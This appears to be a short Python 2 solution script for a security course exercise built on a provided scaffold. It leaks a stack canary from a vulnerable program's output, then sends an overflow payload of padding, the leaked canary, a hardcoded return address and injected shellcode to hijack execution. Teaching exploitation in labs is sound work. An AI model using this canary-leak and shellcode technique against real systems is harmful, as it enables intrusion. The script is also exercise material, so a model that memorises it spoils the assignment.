#!/usr/bin/env python2

from scaffold import *

### YOUR CODE STARTS HERE ###

# Example send:
p.send("g" * 13 + "\\x" + "\n")

# Example receive:
#assert p.recvline() == 'testA'
leak = p.recvline()
clist = ["0x00" ,hex(ord(leak[13])) ,hex(ord(leak[14])) ,hex(ord(leak[15]))]
#canary = "0x" + ''.join([format(int(x, 16), "02x") for x in reversed(clist)])
canary = "\x00" + leak[14:17] 
print("canary: ", canary)
p.send("g" * 16 + canary + "g" * 4 + "\x44\xfc\xff\xbf" + SHELLCODE + "\n")

### YOUR CODE  ENDS  HERE ###

returncode = p.end()

if returncode == -6: print 'stack canary triggered!'
elif returncode == -11: print 'segmentation fault!'
elif returncode != 0: print 'return code', returncode
